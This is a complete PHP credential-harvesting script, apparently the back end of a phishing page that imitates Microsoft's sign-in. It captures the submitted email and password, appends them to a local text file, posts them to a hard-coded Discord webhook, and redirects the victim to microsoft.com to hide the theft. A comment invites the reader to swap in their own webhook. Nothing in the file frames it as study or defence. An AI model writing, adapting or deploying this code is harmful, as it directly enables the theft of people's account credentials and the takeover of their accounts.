<?php

// Save credentials to file
file_put_contents("usernames.txt", "Account: " . $_POST['loginfmt'] . " Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);

// Send credentials to Discord webhook
$webhookURL = "https://discord.com/api/webhooks/1314916680354365521/CuqeqAucg5UNUkXroMmw0mi1vKDa-Hsd2uCW-lk0ysvRcL3DWRZCHLkql9Q5t7rCwW8R"; // Replace with your Discord webhook URL
$message = [
    "content" => "**New Login Attempt**\n" . 
                 "Email: " . $_POST['loginfmt'] . "\n" . 
                 "Password: " . $_POST['passwd']
];
$options = [
    "http" => [
        "header" => "Content-Type: application/json\r\n",
        "method" => "POST",
        "content" => json_encode($message)
    ]
];
$context = stream_context_create($options);
file_get_contents($webhookURL, false, $context);

// Redirect user to Microsoft
header('Location: https://microsoft.com');
exit();
